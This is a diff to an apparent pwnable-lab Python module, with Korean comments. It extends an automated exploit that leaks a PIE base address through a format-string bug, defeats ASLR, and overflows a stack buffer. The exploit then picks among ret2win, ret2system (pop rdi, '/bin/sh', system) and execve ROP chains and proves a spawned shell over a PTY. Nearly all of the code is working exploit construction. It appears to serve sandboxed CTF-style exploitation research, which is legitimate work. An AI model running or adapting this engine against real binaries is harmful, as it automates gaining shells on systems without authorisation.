@@ -11,24 +11,34 @@
    위치별로 주입해 **바이너리 코드 포인터를 유출하는 인자 위치와 그 정적 오프셋**
    ``O`` 를 찾는다(``leaked = base + O``, ASLR 무관 상수). 오라클은 *어느 위치/오프셋*
    인지 식별하는 데만 쓰인다 — 익스 시 base 는 유출값에서 계산한다.
-3. **셸 증명**: leak → ``base = leaked - O`` → ``A*offset [+ ret] + win`` 을 2단계로
-   보내 PTY 로 spawn 된 셸에 ``echo <marker>`` 를 흘려 셸 획득을 증명한다.
+3. **셸 증명**: leak → ``base = leaked - O`` → base 로 rebase 한 체인을 2단계로 보내
+   PTY 로 spawn 된 셸에 ``echo <marker>`` 를 흘려 셸 획득을 증명한다.
+
+체인은 대상에 맞춰 자동 선택한다: ``win`` 함수가 있으면 **ret2win**, 없으면
+``system`` PLT·``/bin/sh``·``pop rdi`` 가젯이 있으면 **ret2system**, 그것도 없으면
+클린 ``pop`` 가젯·``syscall`` 로 **execve** 체인을 base 로 rebase 한다. win 이 없는
+실전 PIE(대부분)까지 진짜 in-band leak 으로 셸을 증명한다.
 """
 
 from __future__ import annotations
 
 import re
 import secrets
+from collections.abc import Callable
+from dataclasses import dataclass
 from pathlib import Path
 
 from pwnable_lab.analyzer.strategy import (
     binary_exec_range,
+    execve_plan,
     find_ret_gadget,
     is_pie,
+    ret2system_plan,
     ret2win_target,
 )
 from pwnable_lab.elf.parser import ElfImage, parse_elf
 from pwnable_lab.payload.cyclic import cyclic, cyclic_find
+from pwnable_lab.payload.pack import RopStep, build_overflow
 from pwnable_lab.sandbox.runner import (
     SandboxLimits,
     resolve_pie_base,
@@ -44,6 +54,23 @@ _HEX = re.compile(rb"0x[0-9a-fA-F]+")
 _PROBE_START = 6
 _PROBE_END = 60
 
+# execve(2) 시스템콜 번호(amd64).
+_SYS_EXECVE = 59
+
+
+@dataclass
+class _Technique:
+    """base(유출값에서 계산) 로 rebase 하는 익스 체인 한 종류.
+
+    ``variants`` 는 ``(정렬용 ret 삽입?, base→payload 빌더)`` 목록으로, movaps 16바이트
+    정렬 변형을 순서대로 시도하기 위한 것이다. ``describe`` 는 관측/유출 base(없으면
+    ``None``)로 리포트용 정적·런타임 주소 필드를 만든다.
+    """
+
+    kind: str  # "ret2win" | "ret2system" | "execve"
+    variants: list[tuple[bool, Callable[[int], bytes]]]
+    describe: Callable[[int | None], dict]
+
 
 def auto_fmt_leak_pie(
     binary_path: str,
@@ -51,16 +78,16 @@ def auto_fmt_leak_pie(
     limits: SandboxLimits | None = None,
     cyclic_length: int = 400,
 ) -> dict:
-    """PIE 바이너리에서 포맷스트링 in-band leak 으로 base 를 복원해 ret2win 셸 증명."""
+    """PIE 바이너리에서 포맷스트링 in-band leak 으로 base 를 복원해 셸 증명.
+
+    체인은 대상 재료에 맞춰 ret2win → ret2system → execve 순으로 자동 선택한다.
+    """
 
     image = parse_elf(Path(binary_path).read_bytes())
     if (image.bits or 64) != 64:
         return {"attempted": False, "reason": "amd64-only"}
     if not is_pie(image):
         return {"attempted": False, "reason": "not-pie"}
-    win = ret2win_target(image)
-    if win is None:
-        return {"attempted": False, "reason": "no-win-target"}
 
     limits = limits or SandboxLimits()
 
@@ -69,30 +96,27 @@ def auto_fmt_leak_pie(
     if offset is None:
         return {"attempted": False, "reason": "no-overflow"}
 
-    # 2) 포맷스트링 leak 위치·오프셋 캘리브레이션(ASLR-off 오라클).
+    # 2) 대상 재료에 맞는 익스 체인을 선택(win → ret2system → execve).
+    technique = _select_technique(image, offset)
+    if technique is None:
+        return {"attempted": False, "reason": "no-technique"}
+
+    # 3) 포맷스트링 leak 위치·오프셋 캘리브레이션(ASLR-off 오라클).
     calib = _calibrate_leak(binary_path, image, limits)
     if calib is None:
         return {"attempted": False, "reason": "no-fmt-leak"}
     position, leak_offset = calib
 
-    # 3) leak → base → rebase ret2win → PTY 셸 증명(movaps 정렬 변형 포함).
-    win_name, win_off = win
-    ret_off = find_ret_gadget(image)
+    # 4) leak → base → rebase 체인 → PTY 셸 증명(정렬 변형 포함).
     prelude = f"%{position}$p".encode()
+    for align, build in technique.variants:
 
-    variants: list[bool] = [False] if ret_off is None else [False, True]
-    for align in variants:
-
-        def make_second(line: bytes, align: bool = align) -> bytes:
+        def make_second(line: bytes, build: Callable[[int], bytes] = build) -> bytes:
             m = _HEX.search(line)
             if not m:
                 return b"A" * offset  # leak 실패 시 정렬만 깨 크래시
             base = int(m.group(), 16) - leak_offset
-            payload = b"A" * offset
-            if align and ret_off is not None:
-                payload += (base + ret_off).to_bytes(8, "little")
-            payload += (base + win_off).to_bytes(8, "little")
-            return payload
+            return build(base)
 
         marker = "PWNPILOT_" + secrets.token_hex(4)
         proof, leaked = run_two_stage_shell(
@@ -107,7 +131,7 @@ def auto_fmt_leak_pie(
             leaked_val = _first_hex(leaked)
             base = None if leaked_val is None else leaked_val - leak_offset
             return _report(
-                win,
+                technique,
                 offset,
                 position,
                 leak_offset,
@@ -120,7 +144,7 @@ def auto_fmt_leak_pie(
             )
 
     return _report(
-        win,
+        technique,
         offset,
         position,
         leak_offset,
@@ -131,6 +155,124 @@ def auto_fmt_leak_pie(
         "did-not-spawn-shell",
         None,
     )
+
+
+def _select_technique(image: ElfImage, offset: int) -> _Technique | None:
+    """대상 재료에 맞는 rebase 가능한 익스 체인을 고른다(ret2win → ret2system → execve).
+
+    win 함수가 있으면 ret2win, 없으면 ``system``·``/bin/sh``·``pop rdi`` 로 ret2system,
+    그것도 없으면 클린 pop 가젯·syscall 로 execve. 재료가 하나도 없으면 ``None``.
+    모든 주소는 PIE 정적(base-0) 오프셋이라 유출 base 를 더해 런타임 주소로 rebase 한다.
+    """
+
+    ret_off = find_ret_gadget(image)
+    win = ret2win_target(image)
+    if win is not None:
+        return _ret2win_technique(win, ret_off, offset)
+    plan = ret2system_plan(image)
+    if plan is not None:
+        return _ret2system_technique(plan, ret_off, offset)
+    execve = execve_plan(image)
+    if execve is not None:
+        return _execve_technique(execve, offset)
+    return None
+
+
+def _ret2win_technique(
+    win: tuple[str, int], ret_off: int | None, offset: int
+) -> _Technique:
+    win_name, win_off = win
+
+    def direct(base: int) -> bytes:
+        return build_overflow(offset, base + win_off, bits=64)
+
+    variants: list[tuple[bool, Callable[[int], bytes]]] = [(False, direct)]
+    if ret_off is not None:
+
+        def aligned(base: int) -> bytes:
+            return build_overflow(
+                offset, base + ret_off, bits=64, chain=[RopStep(base + win_off)]
+            )
+
+        variants.append((True, aligned))
+
+    def describe(base: int | None) -> dict:
+        d = {"target_name": win_name, "target_offset_hex": f"0x{win_off:x}"}
+        if base is not None:
+            d["target_runtime_hex"] = f"0x{base + win_off:x}"
+        return d
+
+    return _Technique("ret2win", variants, describe)
+
+
+def _ret2system_technique(plan: dict, ret_off: int | None, offset: int) -> _Technique:
+    pop_rdi, binsh, system = plan["pop_rdi"], plan["binsh"], plan["system"]
+
+    def direct(base: int) -> bytes:
+        return build_overflow(
+            offset,
+            base + pop_rdi,
+            bits=64,
+            chain=[RopStep(base + binsh), RopStep(base + system)],
+        )
+
+    variants: list[tuple[bool, Callable[[int], bytes]]] = [(False, direct)]
+    if ret_off is not None:
+
+        def aligned(base: int) -> bytes:
+            return build_overflow(
+                offset,
+                base + pop_rdi,
+                bits=64,
+                chain=[
+                    RopStep(base + binsh),
+                    RopStep(base + ret_off),
+                    RopStep(base + system),
+                ],
+            )
+
+        variants.append((True, aligned))
+
+    def describe(base: int | None) -> dict:
+        d = {
+            "pop_rdi_offset_hex": f"0x{pop_rdi:x}",
+            "binsh_offset_hex": f"0x{binsh:x}",
+            "system_offset_hex": f"0x{system:x}",
+        }
+        if base is not None:
+            d["system_runtime_hex"] = f"0x{base + system:x}"
+        return d
+
+    return _Technique("ret2system", variants, describe)
+
+
+def _execve_technique(plan: dict, offset: int) -> _Technique:
+    def build(base: int) -> bytes:
+        # execve("/bin/sh", 0, 0): 모든 가젯·문자열·syscall 이 바이너리 내부라 rebase.
+        chain = [
+            RopStep(base + plan["binsh"]),
+            RopStep(base + plan["pop_rsi"]),
+            RopStep(0),
+            RopStep(base + plan["pop_rdx"]),
+            RopStep(0),
+            RopStep(base + plan["pop_rax"]),
+            RopStep(_SYS_EXECVE),
+            RopStep(base + plan["syscall"]),
+        ]
+        return build_overflow(offset, base + plan["pop_rdi"], bits=64, chain=chain)
+
+    def describe(base: int | None) -> dict:
+        d = {
+            "binsh_offset_hex": f"0x{plan['binsh']:x}",
+            "syscall_offset_hex": f"0x{plan['syscall']:x}",
+        }
+        if base is not None:
+            d["binsh_runtime_hex"] = f"0x{base + plan['binsh']:x}"
+            d["syscall_runtime_hex"] = f"0x{base + plan['syscall']:x}"
+        return d
+
+    # execve 는 정렬 변형 없음(syscall 은 movaps 정렬 요구가 없다).
+    return _Technique("execve", [(False, build)], describe)
 
 
 def _confirm_stage2_offset(
@@ -215,7 +357,7 @@ def _first_hex(data: bytes) -> int | None:
 
 
 def _report(
-    win: tuple[str, int],
+    technique: _Technique,
     offset: int,
     position: int,
     leak_offset: int,
@@ -226,25 +368,25 @@ def _report(
     reason: str,
     proof: dict | None,
 ) -> dict:
-    win_name, win_off = win
     report: dict = {
         "attempted": True,
         "technique": "fmt-leak-pie",
-        "target_name": win_name,
-        "target_offset_hex": f"0x{win_off:x}",
+        "chain": technique.kind,
         "overflow_offset": offset,
         "fmt_position": position,
         "leak_offset_hex": f"0x{leak_offset:x}",
         "alignment_ret_gadget": align,
         "leaked_hex": None if leaked is None else f"0x{leaked:x}",
         "base_hex": None if base is None else f"0x{base:x}",
-        "target_runtime_hex": None if base is None else f"0x{base + win_off:x}",
         "shell_proven": reason == "shell-proven",
         "succeeded": succeeded,
         "reason": reason,
         # base 가 유출값에서 계산되므로 ASLR 이 켜져 있어도 성립하는 진짜 leak 이다.
         "aslr": "defeated-via-inband-leak",
     }
+    # 선택된 체인의 정적·런타임 주소 필드(ret2win 은 target_*, ret2system 은 system_*,
+    # execve 는 binsh/syscall_*)를 병합한다.
+    report.update(technique.describe(base))
     if proof is not None:
         report["shell_proof"] = proof
     return report
